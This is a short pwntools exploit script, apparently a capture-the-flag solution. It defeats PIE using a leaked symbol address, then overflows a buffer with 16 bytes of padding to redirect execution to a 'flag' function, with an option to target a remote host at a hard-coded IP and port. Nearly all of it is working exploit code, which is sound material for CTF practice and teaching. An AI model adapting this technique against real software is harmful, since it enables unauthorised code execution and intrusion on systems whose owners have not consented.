#!/usr/bin/python
from pwn import *

elf = context.binary = ELF("../Setup/pwn")
context.terminal = ['terminator', '-e']

cheesecake = elf.sym["cheesecake"]
info(f"cheesecake @ {hex(cheesecake)}")

gs = \
'''
entry
'''

HOST = ("192.46.232.182:4340").split(":")

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(*HOST) 
    else: 
        return process(elf.path)


def pwn():
    rip_offset = 16
    io = start()
    io.recvuntil(b"!!\n")

    leak = int(io.recvline().strip(b"\n").decode(),16)
    info(f"PIE leak: {hex(leak)}")

    elf.address = leak - cheesecake
    vuln = elf.sym["flag"]
    info(f"PIE Base @ {hex(elf.address)}")
    info(f"flag @ {hex(vuln)}")

    payload = flat([
        b"a" * rip_offset,
        vuln
    ])

    io.sendlineafter(b"> ", payload)
    io.recvline()
    success(io.recvline().decode())

pwn()
